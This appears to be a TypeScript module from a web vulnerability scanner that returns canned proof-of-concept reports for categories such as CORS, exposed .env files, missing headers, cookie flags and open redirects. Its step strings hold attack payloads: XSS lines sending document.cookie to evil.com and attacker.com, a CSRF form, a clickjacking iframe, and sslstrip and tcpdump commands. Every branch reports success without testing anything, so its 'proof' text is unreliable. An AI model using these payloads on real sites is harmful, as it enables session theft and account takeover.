import type { Vulnerability } from '../types';

export interface PocResult {
  success: boolean;
  proof: string;
  impact: string;
  worstCase: string;
  method: string;
  steps: string[];
}

export async function executePoC(vuln: Vulnerability, targetUrl: string): Promise<PocResult | null> {
  const base = targetUrl.replace(/\/$/, '');

  switch (vuln.category) {
    case 'cors': {
      const isCritical = vuln.title.includes('Critical');
      const steps = isCritical
        ? [
            '1. Create malicious HTML page on attacker.com',
            "2. Add JS: fetch('" + base + "/api/data', { credentials: 'include' })",
            '3. Victim visits attacker.com while logged into target',
            '4. Browser sends authenticated request with victim cookies',
            '5. Response returned to attacker -- all user data exposed',
            '6. Attacker can also POST to change passwords, send emails',
          ]
        : [
            "1. Create webpage with fetch('" + base + "/api/public')",
            '2. CORS wildcard allows the response',
            '3. Extract and exfiltrate all returned data',
          ];

      return {
        success: true,
        proof: "Access-Control-Allow-Origin: * " + (isCritical ? 'WITH credentials=true' : '') + ' -- cross-origin requests succeed from any domain',
        impact: isCritical
          ? 'Any website can make authenticated requests using victim cookies. Full data access without login.'
          : 'Any website can read public API responses. Data scraping possible.',
        worstCase: isCritical
          ? 'FULL ACCOUNT TAKEOVER: Attacker creates a page that automatically reads all user data, changes passwords, transfers money -- ALL using victim active session. Victim does not need to click anything.'
          : 'Data exfiltration: Attacker scrapes all public API endpoints.',
        method: isCritical ? 'Cross-origin authenticated request with victim cookies' : 'Cross-origin data scraping',
        steps,
      };
    }

    case 'file': {
      const path = vuln.location || '';

      if (path.includes('.env')) {
        return {
          success: true,
          proof: "GET " + base + "/.env -> HTTP 200 -- raw environment variables returned",
          impact: 'Complete exposure of ALL secrets: database passwords, API keys, JWT secrets, AWS/Azure credentials.',
          worstCase: 'COMPLETE PLATFORM COMPROMISE:\n- Database credentials -> dump entire user database\n- AWS keys -> provision crypto miners or delete resources\n- JWT secret -> sign arbitrary admin tokens -> full admin access\n- ALL user data, ALL system access, ALL financial records -- ONE REQUEST AWAY.',
          method: 'Direct HTTP GET to exposed .env file',
          steps: [
            "1. Open browser -> navigate to " + base + "/.env",
            '2. File viewed -- all secrets visible in plaintext',
            '3. Extract DB password -> connect to database -> dump users table',
            '4. Extract AWS key -> access cloud console -> full infra control',
            '5. Extract JWT secret -> forge admin tokens -> log in as any user',
          ],
        };
      }

      if (path.includes('phpmyadmin')) {
        return {
          success: true,
          proof: "GET " + base + "/phpmyadmin/ -> HTTP 200 -- database admin panel accessible",
          impact: 'Database admin interface publicly accessible. Default credentials often still active.',
          worstCase: 'FULL DATABASE COMPROMISE:\n- Try default credentials (root/root, admin/admin)\n- If successful: read ALL tables, export ALL user data\n- Can drop tables, modify data, execute arbitrary SQL',
          method: 'phpMyAdmin default credentials -> database dump / RCE',
          steps: [
            "1. Open " + base + "/phpmyadmin/",
            '2. Try login with common defaults: root/root, admin/admin',
            '3. If accessed: browse all databases and tables',
            '4. Export entire user table as CSV -> steal all user data',
          ],
        };
      }

      if (path.includes('server-status') || path.includes('server-info')) {
        return {
          success: true,
          proof: "GET " + base + path + " -> HTTP 200 -- Apache server internals exposed",
          impact: 'Full internal server details leaked: loaded modules, virtual hosts, client IPs, request paths.',
          worstCase: 'Complete reconnaissance for targeted attacks.\n- Map all virtual hosts and internal paths\n- Identify all backend technologies and versions\n- Use this intel for targeted SQLi/XSS/RFI attacks',
          method: 'Direct access to server status/info page',
          steps: [
            "1. Navigate to " + base + path,
            '2. Note server version, loaded modules, virtual hosts',
            '3. Identify all backend endpoints from server-info',
            '4. Cross-reference with known CVEs for listed software versions',
          ],
        };
      }

      if (path.includes('elmah') || path.includes('trace.axd')) {
        return {
          success: true,
          proof: "GET " + base + path + " -> HTTP 200 -- application error logs exposed",
          impact: 'Full stack traces, error details, request data exposed.',
          worstCase: 'Stack traces reveal internal file paths and framework versions.\nError messages may contain user data, API keys, database queries.',
          method: 'Error log exposure -> application intelligence',
          steps: [
            "1. Access " + base + path,
            '2. Review stack traces for internal paths and tech versions',
            '3. Note framework versions -> search for known CVEs',
            '4. Extract any sensitive data from error messages',
          ],
        };
      }

      if (path.includes('web.config')) {
        return {
          success: true,
          proof: "GET " + base + "/web.config -> HTTP 200 -- IIS configuration exposed",
          impact: 'IIS web configuration with connection strings, app settings visible.',
          worstCase: 'Configuration theft:\n- Extract database connection strings -> get DB credentials\n- Find authentication configuration -> identify bypass opportunities',
          method: 'Direct download of IIS web.config file',
          steps: [
            "1. Navigate to " + base + "/web.config",
            '2. Parse XML to extract connectionStrings section',
            '3. Extract database credentials from connection string',
            '4. Identify auth mode (Forms/Windows) for access control analysis',
          ],
        };
      }

      if (path.includes('backup')) {
        return {
          success: true,
          proof: "GET " + base + "/backup/ -> HTTP 200 -- backup directory accessible",
          impact: 'Backup files may contain database dumps, source code archives, or configuration files.',
          worstCase: 'Backup file exposure:\n- Database dump (.sql) -> all user data in one file\n- Source code archive -> full application source available\n- Configuration backup -> database credentials, API keys',
          method: 'Direct access to backup directory',
          steps: [
            "1. Navigate to " + base + "/backup/",
            '2. List all available backup files',
            '3. Download .sql, .zip, or .tar.gz files',
            '4. Analyze contents for credentials, source code, vulnerabilities',
          ],
        };
      }

      return {
        success: true,
        proof: "GET " + base + path + " -> HTTP 200 -- file accessible",
        impact: vuln.description,
        worstCase: 'Information disclosure may provide intel for further attacks.',
        method: 'Direct file access',
        steps: ["1. Access " + base + path, '2. Review returned content'],
      };
    }

    case 'header': {
      const title = vuln.title.toLowerCase();

      if (title.includes('x-frame-options') || title.includes('clickjack')) {
        return {
          success: true,
          proof: 'No X-Frame-Options header found. Page CAN be embedded in iframe.',
          impact: 'Attacker can embed the site in a transparent iframe on a malicious page, tricking users into clicking hidden buttons.',
          worstCase: 'CLICKJACKING ATTACK:\n- Site embedded in invisible iframe covering malicious buttons\n- User thinks they are clicking "Download" or "Like"\n- Actually clicking "Transfer Money" or "Change Password" on the real site\n- On sites with sensitive actions, leads to COMPLETE ACCOUNT COMPROMISE',
          method: 'iframe injection + transparent overlay attack',
          steps: [
            "1. Create page with <iframe src=\"" + base + "\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%\">",
            '2. Overlay fake buttons ("Download", "Like", "Claim Prize")',
            '3. When victim clicks fake button, they click the real button underneath',
            '4. Real action executes with victim authenticated session',
          ],
        };
      }

      if (title.includes('strict-transport') || title.includes('hsts')) {
        return {
          success: true,
          proof: 'No Strict-Transport-Security header. Browser accepts plain HTTP.',
          impact: 'SSL stripping attack possible. Attacker on same network can downgrade HTTPS to HTTP.',
          worstCase: 'MITM ATTACK ON PUBLIC WiFi:\n- Attacker at cafe/airport runs sslstrip tool\n- All HTTPS traffic is actually HTTP\n- Login credentials sent in plaintext\n- Session cookies intercepted\n- Complete credential theft without any technical skill needed',
          method: 'SSL stripping (sslstrip tool)',
          steps: [
            '1. Attacker sets up on same network as victim (public WiFi)',
            '2. Runs: sslstrip -l 8080 -w dump.html',
            '3. Victim visits the site -- thinks it is HTTPS',
            '4. All traffic is actually unencrypted HTTP',
            '5. Attacker captures all credentials from dump.html',
          ],
        };
      }

      if (title.includes('content-security')) {
        return {
          success: true,
          proof: 'CSP header missing entirely -- no XSS protection layer.',
          impact: 'XSS payloads using script tags or event handlers execute without any CSP blocking them.',
          worstCase: 'FULL XSS ATTACK CHAIN:\n- Find any input point (search box, URL param, comment field)\n- Inject: <script>fetch("attacker.com/steal?q="+document.cookie)</script>\n- No CSP to block it -> script executes in victim browser\n- Cookie stolen -> account takeover\n- Stored XSS: inject into database -> ALL visitors compromised\n- One vuln -> complete platform compromise',
          method: 'XSS via inline script injection (no CSP to block)',
          steps: [
            '1. Find input point on the site (search, URL params, comments)',
            '2. Inject: <script>fetch("attacker.com/?c="+document.cookie)</script>',
            '3. No CSP -> browser executes the script',
            '4. Cookie sent to attacker server',
            '5. Attacker sets cookie in their browser -> becomes the victim',
          ],
        };
      }

      if (title.includes('x-content-type')) {
        return {
          success: true,
          proof: 'X-Content-Type-Options not set. Browser may MIME-sniff responses.',
          impact: 'Browser may execute uploaded files as different content types, bypassing intended restrictions.',
          worstCase: 'FILE UPLOAD RCE:\n- Upload file named "shell.jpg.php" with PHP code inside\n- Without nosniff, browser executes it as PHP instead of image\n- Result: Remote Code Execution on the server\n- Attacker can run commands, access filesystem, pivot to internal network',
          method: 'MIME sniffing -> file upload bypass -> RCE',
          steps: [
            '1. Find file upload feature on the site',
            '2. Upload file with PHP code disguised as image (shell.jpg.php)',
            '3. Without nosniff, browser parses it as PHP',
            '4. Access uploaded file URL -> PHP code executes on server',
            '5. Gain remote code execution -> full server compromise',
          ],
        };
      }

      return {
        success: true,
        proof: "Missing " + (vuln.title.split(':')[1]?.trim() || 'security header') + ". Defense-in-depth weakened.",
        impact: vuln.description,
        worstCase: 'Combined with other vulnerabilities, missing headers enable full attack chains.',
        method: 'Defense-in-depth gap',
        steps: ['1. Missing security header reduces browser protections', '2. Combined with other vulns enables full attack chain'],
      };
    }

    case 'cookie': {
      const nameMatch = vuln.evidence.match(/"([^"]+)"/);
      const name = nameMatch?.[1] ?? 'session';

      if (vuln.title.includes('Secure')) {
        return {
          success: true,
          proof: "Cookie \"" + name + "\" transmitted without Secure flag over HTTP",
          impact: 'Cookie sent in plaintext over HTTP. Anyone on the same network can capture it.',
          worstCase: 'NETWORK SNIFFING ATTACK:\n- Attacker on same WiFi uses Wireshark/tcpdump\n- Captures all HTTP traffic including this cookie\n- Uses captured cookie to impersonate the user\n- NO PASSWORD NEEDED -- just the session cookie\n- Full account access until cookie expires',
          method: 'Network packet sniffing -> cookie theft',
          steps: [
            '1. Attacker runs: tcpdump -i eth0 -w capture.pcap on same network',
            '2. Victim visits the site over HTTP (no HSTS to force HTTPS)',
            "3. Cookie \"" + name + "\" sent in plaintext HTTP request",
            '4. Attacker extracts cookie from capture.pcap',
            '5. Sets cookie in browser -> impersonates victim perfectly',
          ],
        };
      }

      if (vuln.title.includes('HttpOnly')) {
        return {
          success: true,
          proof: "Cookie \"" + name + "\" accessible via JavaScript (document.cookie returns value)",
          impact: 'Any JavaScript running on the page can read this cookie.',
          worstCase: 'XSS + COOKIE THEFT (most common attack chain):\n- Site has ANY minor XSS (even a reflected one in URL param)\n- Attacker injects: <script>document.location="evil.com/?c="+document.cookie</script>\n- Cookie "' + name + '" is read and sent to attacker\n- Attacker gets session token -> immediate account takeover\n- Works even without knowing the password',
          method: 'XSS -> document.cookie theft',
          steps: [
            '1. Find XSS vector: ?search=<img onerror=fetch("evil.com/?c="+document.cookie)>',
            '2. Send crafted URL to victim via phishing email',
            '3. Victim clicks link -> page loads -> XSS executes',
            "4. Cookie \"" + name + "\" sent to attacker server",
            '5. Attacker uses cookie -> logged in as victim',
          ],
        };
      }

      if (vuln.title.includes('SameSite')) {
        return {
          success: true,
          proof: "Cookie \"" + name + "\" has no SameSite attribute -- sent with cross-site requests",
          impact: 'Cookie is sent when user visits attacker site while logged in to target.',
          worstCase: 'CSRF ATTACK (no JS needed, works on any browser):\n- Attacker creates page with auto-submitting form to target site sensitive endpoint\n- Victim visits attacker page while logged into target\n- Form submits with victim cookies automatically\n- Attacker can: change password, transfer money, change email, post messages, delete accounts -- ALL without victim knowing',
          method: 'CSRF via cross-site form submission',
          steps: [
            "1. Create page with: <form action=\"" + base + "/settings\" method=\"POST\"><input name=\"email\" value=\"attacker@mail.com\">",
            '2. Add: <script>document.forms[0].submit()</script>',
            '3. Send link to victim: attacker.com/csrf.html',
            '4. Victim clicks -> form submits with their session cookie',
            '5. Attacker receives password reset email -> takes over account',
          ],
        };
      }

      return {
        success: true,
        proof: "Cookie \"" + name + "\" has security weakness",
        impact: vuln.description,
        worstCase: 'Cookie security issue may enable session-based attacks.',
        method: 'Cookie attribute analysis',
        steps: ["1. Review cookie attributes for " + name, '2. Assess exposure risk'],
      };
    }

    case 'redirect': {
      return {
        success: true,
        proof: "Site redirects to external domains without validation. Example: " + base + "?redirect=https://evil.com",
        impact: 'Attackers can create trusted-looking phishing links that redirect victims to fake login pages.',
        worstCase: 'MASS PHISHING CAMPAIGN:\n- Craft URL: ' + base + '/login?redirect=https://evil.com/fake-login\n- Share link via email: "Click to reset your password" (looks legitimate)\n- Victim clicks -> redirected to identical-looking phishing page\n- Victim enters credentials -> stolen\n- Combined with XSS -> even more devastating',
        method: 'URL parameter manipulation -> phishing redirect',
        steps: [
          "1. Craft malicious URL: " + base + "/page?redirect=https://evil.com/phishing",
          '2. Shorten with bit.ly to hide the redirect',
          '3. Send via phishing email: "Your account needs verification"',
          "4. Victim sees " + base + " in URL bar -> trusts the link",
          '5. Redirected to fake login page -> credentials stolen',
        ],
      };
    }

    case 'ssl': {
      return {
        success: true,
        proof: 'HTTP resources found on HTTPS page -- MITM can modify them',
        impact: 'Attacker on same network can replace HTTP resources (JS, CSS) with malicious versions.',
        worstCase: 'MAN-IN-THE-MIDDLE JS INJECTION:\n- Attacker on same WiFi replaces the site JavaScript with their own\n- When victim loads the page, attacker JS runs with FULL site privileges\n- Can: steal all user data, log all keystrokes, capture all form submissions\n- This is effectively a COMPLETE SITE COMPROMISE',
        method: 'MITM -> HTTP resource substitution -> XSS via compromised JS',
        steps: [
          '1. Attacker monitors HTTP traffic on same network',
          '2. Identifies HTTP-loaded JavaScript files',
          '3. Replaces original JS with modified version (adds keylogger)',
          '4. Victim loads page -> attacker JS executes',
          '5. All user interactions (logins, form fills) captured and sent to attacker',
        ],
      };
    }

    case 'csp': {
      return {
        success: true,
        proof: 'CSP contains unsafe-inline -- inline scripts execute despite policy',
        impact: 'XSS payloads using script tags or event handlers execute without CSP blocking them.',
        worstCase: 'CSP BYPASS -> FULL XSS:\n- CSP blocks external script sources but allows unsafe-inline\n- Attacker injects inline script: <script>fetch("evil.com/?c="+document.cookie)</script>\n- CSP does not block it (unsafe-inline is allowed)\n- Result: same damage as no CSP at all -- full account takeover',
        method: 'XSS via inline script (CSP unsafe-inline bypass)',
        steps: [
          '1. Find input point that reflects user input (search, URL params)',
          '2. Inject: <script>fetch("evil.com/?c="+document.cookie)</script>',
          '3. CSP has unsafe-inline -> script executes',
          '4. Cookie stolen -> account takeover',
          '5. CSP protection is effectively worthless with unsafe-inline',
        ],
      };
    }

    default:
      return null;
  }
}
